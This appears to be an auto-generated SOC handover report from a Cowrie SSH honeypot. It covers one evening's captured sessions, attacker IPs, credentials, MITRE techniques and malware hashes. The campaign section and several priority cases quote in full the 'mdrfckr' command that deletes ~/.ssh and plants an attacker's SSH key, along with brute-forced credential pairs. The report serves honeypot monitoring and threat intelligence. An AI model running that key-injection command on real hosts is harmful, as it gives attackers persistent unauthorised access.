# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-31 |
| **Generated At** | 2026-03-31T20:41:14Z |
| **Shift Time** | 20:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **31** |
| Confirmed Threats | **30** |
| False Positives Filtered | **1** (3.2%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **13** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **21** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **24** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **11** |
| Unique Passwords | **17** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 4 |
| `ubuntu` | 2 |
| `administrator` | 1 |
| `user` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `password` | 2 |
| `root@0000` | 1 |
| `maintenance` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `root@0000` | 1 |
| `administrator` | `maintenance` | 1 |
| `user` | `user99` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root@0000` | `138.255.157.62` | 2026-03-31T19:02:36 |
| `root` | `3245gs5662d34` | `138.255.157.62` | 2026-03-31T19:02:43 |
| `root` | `asdf!@#$` | `103.154.62.14` | 2026-03-31T20:13:41 |
| `root` | `3245gs5662d34` | `103.154.62.14` | 2026-03-31T20:13:45 |
| `root` | `hacker123` | `152.250.243.47` | 2026-03-31T20:14:36 |
| `root` | `3245gs5662d34` | `152.250.243.47` | 2026-03-31T20:14:44 |
| `root` | `Asdf12345` | `61.23.36.232` | 2026-03-31T20:16:57 |
| `root` | `3245gs5662d34` | `61.23.36.232` | 2026-03-31T20:17:01 |
| `root` | `12` | `20.102.235.86` | 2026-03-31T20:27:46 |
| `root` | `password` | `20.102.235.86` | 2026-03-31T20:34:26 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.154.62.14`, `138.255.157.62`, `152.250.243.47`, `61.23.36.232`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **1** |
| High-Risk ASNs | **1** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 21 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-46d438b2837c

| Field | Detail |
|---|---|
| **Source IP** | `138.255.157[.]62` |
| **First Seen** | 2026-03-31 19:02 |
| **Last Seen** | 2026-03-31 19:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 19:02:34` | `cowrie.session.connect` |
| `2026-03-31 19:02:34` | `cowrie.client.version` |
| `2026-03-31 19:02:34` | `cowrie.client.kex` |
| `2026-03-31 19:02:36` | `cowrie.login.success` |
| `2026-03-31 19:02:36` | `cowrie.session.params` |
| `2026-03-31 19:02:36` | `cowrie.command.input` |
| `2026-03-31 19:02:36` | `cowrie.command.failed` |
| `2026-03-31 19:02:37` | `cowrie.log.closed` |
| `2026-03-31 19:02:37` | `cowrie.session.params` |
| `2026-03-31 19:02:37` | `cowrie.command.input` |
| `2026-03-31 19:02:38` | `cowrie.session.file_download` |
| `2026-03-31 19:02:38` | `cowrie.log.closed` |
| `2026-03-31 19:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.255.157[.]62` to AbuseIPDB if not already reported
- [ ] Block `138.255.157[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fcc05393511

| Field | Detail |
|---|---|
| **Source IP** | `138.255.157[.]62` |
| **First Seen** | 2026-03-31 19:02 |
| **Last Seen** | 2026-03-31 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 19:02:41` | `cowrie.session.connect` |
| `2026-03-31 19:02:41` | `cowrie.client.version` |
| `2026-03-31 19:02:41` | `cowrie.client.kex` |
| `2026-03-31 19:02:43` | `cowrie.login.success` |
| `2026-03-31 19:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.255.157[.]62` to AbuseIPDB if not already reported
- [ ] Block `138.255.157[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b157c41a74fc

| Field | Detail |
|---|---|
| **Source IP** | `103.154.62[.]14` |
| **First Seen** | 2026-03-31 20:13 |
| **Last Seen** | 2026-03-31 20:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:13:41` | `cowrie.session.connect` |
| `2026-03-31 20:13:41` | `cowrie.client.version` |
| `2026-03-31 20:13:41` | `cowrie.client.kex` |
| `2026-03-31 20:13:41` | `cowrie.login.success` |
| `2026-03-31 20:13:42` | `cowrie.session.params` |
| `2026-03-31 20:13:42` | `cowrie.command.input` |
| `2026-03-31 20:13:42` | `cowrie.command.failed` |
| `2026-03-31 20:13:42` | `cowrie.log.closed` |
| `2026-03-31 20:13:42` | `cowrie.session.params` |
| `2026-03-31 20:13:42` | `cowrie.command.input` |
| `2026-03-31 20:13:42` | `cowrie.session.file_download` |
| `2026-03-31 20:13:42` | `cowrie.log.closed` |
| `2026-03-31 20:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.62[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.154.62[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059924c62a00

| Field | Detail |
|---|---|
| **Source IP** | `103.154.62[.]14` |
| **First Seen** | 2026-03-31 20:13 |
| **Last Seen** | 2026-03-31 20:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:13:44` | `cowrie.session.connect` |
| `2026-03-31 20:13:44` | `cowrie.client.version` |
| `2026-03-31 20:13:44` | `cowrie.client.kex` |
| `2026-03-31 20:13:45` | `cowrie.login.success` |
| `2026-03-31 20:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.62[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.154.62[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4303c19e2b7a

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-03-31 20:14 |
| **Last Seen** | 2026-03-31 20:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:14:34` | `cowrie.session.connect` |
| `2026-03-31 20:14:34` | `cowrie.client.version` |
| `2026-03-31 20:14:35` | `cowrie.client.kex` |
| `2026-03-31 20:14:36` | `cowrie.login.success` |
| `2026-03-31 20:14:37` | `cowrie.session.params` |
| `2026-03-31 20:14:37` | `cowrie.command.input` |
| `2026-03-31 20:14:37` | `cowrie.command.failed` |
| `2026-03-31 20:14:37` | `cowrie.log.closed` |
| `2026-03-31 20:14:38` | `cowrie.session.params` |
| `2026-03-31 20:14:38` | `cowrie.command.input` |
| `2026-03-31 20:14:38` | `cowrie.session.file_download` |
| `2026-03-31 20:14:38` | `cowrie.log.closed` |
| `2026-03-31 20:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8460ad3f01b

| Field | Detail |
|---|---|
| **Source IP** | `152.250.243[.]47` |
| **First Seen** | 2026-03-31 20:14 |
| **Last Seen** | 2026-03-31 20:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:14:42` | `cowrie.session.connect` |
| `2026-03-31 20:14:42` | `cowrie.client.version` |
| `2026-03-31 20:14:42` | `cowrie.client.kex` |
| `2026-03-31 20:14:44` | `cowrie.login.success` |
| `2026-03-31 20:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.250.243[.]47` to AbuseIPDB if not already reported
- [ ] Block `152.250.243[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1828b81e2f96

| Field | Detail |
|---|---|
| **Source IP** | `61.23.36[.]232` |
| **First Seen** | 2026-03-31 20:16 |
| **Last Seen** | 2026-03-31 20:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:16:56` | `cowrie.session.connect` |
| `2026-03-31 20:16:56` | `cowrie.client.version` |
| `2026-03-31 20:16:56` | `cowrie.client.kex` |
| `2026-03-31 20:16:57` | `cowrie.login.success` |
| `2026-03-31 20:16:57` | `cowrie.session.params` |
| `2026-03-31 20:16:57` | `cowrie.command.input` |
| `2026-03-31 20:16:57` | `cowrie.command.failed` |
| `2026-03-31 20:16:57` | `cowrie.log.closed` |
| `2026-03-31 20:16:58` | `cowrie.session.params` |
| `2026-03-31 20:16:58` | `cowrie.command.input` |
| `2026-03-31 20:16:58` | `cowrie.session.file_download` |
| `2026-03-31 20:16:58` | `cowrie.log.closed` |
| `2026-03-31 20:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.23.36[.]232` to AbuseIPDB if not already reported
- [ ] Block `61.23.36[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97b316792db

| Field | Detail |
|---|---|
| **Source IP** | `61.23.36[.]232` |
| **First Seen** | 2026-03-31 20:17 |
| **Last Seen** | 2026-03-31 20:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:17:00` | `cowrie.session.connect` |
| `2026-03-31 20:17:00` | `cowrie.client.version` |
| `2026-03-31 20:17:00` | `cowrie.client.kex` |
| `2026-03-31 20:17:01` | `cowrie.login.success` |
| `2026-03-31 20:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.23.36[.]232` to AbuseIPDB if not already reported
- [ ] Block `61.23.36[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612c117cbc92

| Field | Detail |
|---|---|
| **Source IP** | `20.102.235[.]86` |
| **First Seen** | 2026-03-31 20:27 |
| **Last Seen** | 2026-03-31 20:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d ':' -f2- | sed 's/^ *//' | xargs || echo unknown` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:27:45` | `cowrie.session.connect` |
| `2026-03-31 20:27:45` | `cowrie.client.version` |
| `2026-03-31 20:27:45` | `cowrie.client.kex` |
| `2026-03-31 20:27:46` | `cowrie.login.success` |
| `2026-03-31 20:27:46` | `cowrie.session.params` |
| `2026-03-31 20:27:46` | `cowrie.command.input` |
| `2026-03-31 20:27:47` | `cowrie.log.closed` |
| `2026-03-31 20:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.235[.]86` to AbuseIPDB if not already reported
- [ ] Block `20.102.235[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db47b191f12

| Field | Detail |
|---|---|
| **Source IP** | `20.102.235[.]86` |
| **First Seen** | 2026-03-31 20:34 |
| **Last Seen** | 2026-03-31 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-31 20:34:25` | `cowrie.session.connect` |
| `2026-03-31 20:34:25` | `cowrie.client.version` |
| `2026-03-31 20:34:25` | `cowrie.client.kex` |
| `2026-03-31 20:34:26` | `cowrie.login.success` |
| `2026-03-31 20:34:26` | `cowrie.session.params` |
| `2026-03-31 20:34:26` | `cowrie.command.input` |
| `2026-03-31 20:34:26` | `cowrie.log.closed` |
| `2026-03-31 20:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.102.235[.]86` to AbuseIPDB if not already reported
- [ ] Block `20.102.235[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.191.28[.]64` | **2** | 2026-03-31 19:01 | 2026-03-31 19:47 | 4m | 0 | `T1592` | 🟢 LOW |
| `103.154.62[.]14` | 1 | 2026-03-31 20:13 | 2026-03-31 20:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.7[.]189` | 1 | 2026-03-31 19:04 | 2026-03-31 19:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.192.42[.]14` | 1 | 2026-03-31 20:03 | 2026-03-31 20:03 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.255.157[.]62` | 1 | 2026-03-31 19:02 | 2026-03-31 19:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-03-31 18:59 | 2026-03-31 18:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]16` | 1 | 2026-03-31 20:21 | 2026-03-31 20:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `142.67.133[.]241` | 1 | 2026-03-31 19:24 | 2026-03-31 19:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `147.93.155[.]213` | 1 | 2026-03-31 19:36 | 2026-03-31 19:37 | 30s | 0 | `T1592` | 🟢 LOW |
| `152.250.243[.]47` | 1 | 2026-03-31 20:14 | 2026-03-31 20:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `173.25.186[.]130` | 1 | 2026-03-31 19:22 | 2026-03-31 19:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.204.71[.]189` | 1 | 2026-03-31 20:40 | 2026-03-31 20:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.41.81[.]65` | 1 | 2026-03-31 19:42 | 2026-03-31 19:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.23.36[.]232` | 1 | 2026-03-31 20:16 | 2026-03-31 20:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `62.201.232[.]114` | 1 | 2026-03-31 20:21 | 2026-03-31 20:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.175[.]75` | 1 | 2026-03-31 20:27 | 2026-03-31 20:27 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]109` | 1 | 2026-03-31 19:02 | 2026-03-31 19:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.218.95[.]154` | 1 | 2026-03-31 19:28 | 2026-03-31 19:28 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.217.128[.]132` | 1 | 2026-03-31 19:43 | 2026-03-31 19:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **27/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `62.201.232[.]114` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 5 |
| `111.70.7[.]189` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `65.20.237[.]109` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 21 |
| `147.93.155[.]213` | IN | Contabo GmbH | **100** ⚠️ | 1 |
| `173.25.186[.]130` | US | MEDIACOMCC | **100** ⚠️ | 50 |
| `84.217.128[.]132` | SE | Telenor Sverige AB | **100** ⚠️ | 11 |
| `117.192.42[.]14` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 14 |
| `142.67.133[.]241` | CA | Eastlink HSI | **100** ⚠️ | 6 |
| `31.41.81[.]65` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `103.154.62[.]14` | VN | SUNCLOUD TECHNOLOGY INFRASTRUCTURE JOINT STOCK COMPANY | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 27 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 4 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 31 cases |
| Tool 34  | Credential Extractor        | ✅ 24 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 21 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (3.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 1 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 19 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-31T20:41:14Z_
